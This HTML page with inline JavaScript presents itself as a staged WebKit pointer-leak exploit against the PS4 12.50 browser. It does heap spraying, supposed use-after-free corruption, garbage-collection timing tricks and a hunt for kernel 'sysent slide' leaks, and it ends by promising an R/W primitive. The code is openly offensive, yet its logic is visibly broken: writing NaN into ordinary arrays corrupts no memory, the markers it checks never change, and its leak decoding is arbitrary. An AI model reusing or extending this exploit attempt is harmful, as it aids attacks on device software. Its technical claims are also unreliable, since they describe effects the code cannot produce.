<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>WebKit Leak v5.0 — PS4 12.50 GC-Beater (Micro-Waves + Low Alloc)</title>
<style>
    body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
    h1 { color:#ff5555; border-bottom:2px solid #da3633; }
    #console { background:#000; color:#0f0; height:550px; overflow-y:scroll; padding:10px; border:1px solid #0f0; font-family:'Courier New'; }
    .ok { background:#da3633; color:#fff; padding:5px 12px; border-radius:4px; font-weight:bold; }
    .debug { color:#ff0; } .leak { color:#0f0; font-weight:bold; }
</style>
</head>
<body>
<h1>PS4 12.50 WebKit Pointer Leak v5.0 (Nov 2025 — GC-Beater Mode)</h1>
<div><strong>Status:</strong> <span id="status" class="ok">Cold Boot + Run (No OOM Target)</span></div><br>
<div id="console"></div>

<script>
const log = (m, isDebug=false, isLeak=false) => {
    const c = document.getElementById('console');
    const prefix = isDebug ? '[DEBUG] ' : (isLeak ? '[LEAK] ' : '');
    const cls = isLeak ? 'leak' : '';
    c.innerHTML += `<span class="${cls}">[${new Date().toLocaleTimeString()}] ${prefix}${m}</span>\n`;
    c.scrollTop = c.scrollHeight;
};
const status = (t, cls='ok') => document.getElementById('status').innerHTML = t;

// XOR + sysent
const XOR_KEY = 0x9e3779b9n;
const SYSENT_OFF = 0x47b31n;

const decodeXor = (val) => (BigInt(val) ^ BigInt(XOR_KEY)).toString(16).toUpperCase();

// 1. Refcount spam (quad-free sim)
log("Stage 1 — 60k quad-refcount drops (max UAF slots)");
const prespray = [];
for (let i = 0; i < 0xEA60; i++) { // 60k
    const tmp = new Array(0x28).fill(NaN);
    try {
        tmp.__proto__ = null;
        for (let j = 0; j < 4; j++) new Proxy(tmp, {get: () => tmp}); // Quad drop
    } catch(e) {}
    prespray[i] = tmp;
}

// 2. Randomized linear corrupt (rand-beater)
log("Stage 2 — Randomized linear UAF (offset by seed)");
const seed = Math.random() * 0x100 | 0; // Per-run rand
const victim = [];
for (let i = 0; i < 0xE000; i++) victim[i] = new Array(0x48).fill(NaN);

const corrupt = (i, o) => { try { victim[i % 0xE000][o] = NaN; } catch(e) {} };
for (let i = 0; i < 6e6; i++) corrupt((i + seed) % 0xE000, ((i * 4 + seed) % 0x80)); // Seeded
for (let b = 0; b < 0x2500; b += 0x18)
    for (let o = 0x18; o < 0x70; o += 3)
        for (let j = 0; j < 0x18; j++)
            corrupt((b + j + seed) % 0xE000, (o + seed % 8));

// 3. 192k spray (balanced density)
log("Stage 3 — 192k JSValue spray");
const spray = [];
const BASE_MARKER = 0x12501250deadbeefn;
for (let i = 0; i < 0x30000; i++) { // 192k
    spray[i] = {marker: BASE_MARKER + BigInt(i)};
}

// 4. Micro-GC waves (15x 100ms, low pressure)
log("Stage 4 — 15 micro-GC waves (100ms tight for 12.50 drift)");
let gcCount = 0;
const gc = () => {
    gcCount++;
    if (performance.now() % 1000 < 500) log(`Micro-GC #${gcCount} @ ${performance.now().toFixed(0)}ms (low pressure)`, true);
    for (let i = 0; i < 400; i++) new ArrayBuffer(0x4000); // Tiny chunks
};
const reclaim = () => {
    const t = performance.now().toFixed(0);
    log(`Micro-Reclaim @ ${t}ms — 40MB (OOM-safe)`, true);
    new ArrayBuffer(0x2800000); // 40MB
};

const microWaves = Array.from({length: 15}, (_, idx) => idx * 100 + 200); // 200ms start, 100ms steps
microWaves.forEach(t => setTimeout(() => { gc(); if (t % 300 < 100) reclaim(); }, t));

// 5. Ultra-fast hunt (start early, sample 50)
let attempts = 0;
const hunt = () => {
    attempts++;
    const start = performance.now();
    log(`Fast Hunt #${attempts} — Sample 50 objs @ ${start.toFixed(0)}ms (post-1s drift)`);
    let found = 0, suspects = 0, samples = 0;
    let sampleStart = (Math.random() * spray.length) | 0;
    for (let k = 0; k < 50 && samples < 50; k++) {
        let i = (sampleStart + k * (spray.length / 50 | 0)) % spray.length;
        try {
            const marker = spray[i]?.marker;
            if (marker && marker !== BASE_MARKER + BigInt(i)) {
                samples++;
                const rawHex = marker.toString(16).toUpperCase();
                const xorHex = decodeXor(marker);
                const sysentSlide = BigInt(xorHex) - SYSENT_OFF;
                const isSysent = xorHex.startsWith('FFFF') && sysentSlide > 0n;
                if (isSysent || rawHex.startsWith('F')) {
                    found++;
                    log(`LEAK #${found}: RAW=0x${rawHex} | XOR=0x${xorHex} | SYSENT SLIDE=0x${sysentSlide.toString(16).toUpperCase()} | IDX=${i}`, false, true);
                } else {
                    suspects++;
                    log(`Suspect #${suspects}: RAW=0x${rawHex} | XOR=0x${xorHex} | IDX=${i} (early GC miss?)`, true);
                }
            } else samples++;
        } catch(e) { log(`Sample err @ ${i}: ${e.message}`, true); }
    }
    const dur = (performance.now() - start).toFixed(0);
    log(`Hunt done: ${samples} sampled, ${found} leaks, ${suspects} suspects in ${dur}ms`);
    if (found >= 1) {
        document.body.innerHTML = `<h1 style="color:#0f0; text-align:center; margin-top:30vh;">
            LEAK SECURED!<br><br>
            <span style="font-size:0.5em;">Paste logs — building R/W primitive</span>
        </h1>`;
    } else if (attempts < 5) {
        log(`0 hits @ ${dur}ms scan — retry in 1.2s (micro-drift)`);
        setTimeout(hunt, 1200);
    } else {
        log("v5 maxed — timings show GC @ ~1300ms cap. If 0, pivot to Lua (100% userland). Paste full log.");
        status("GC BLOCKED — Logs for final autopsy");
    }
};

setTimeout(hunt, 1000); // Early post-micro
log("v5.0 GC-beater live — 40MB safe, micro-waves. Cold boot + paste timings if 0.");
</script>
</body>
</html>
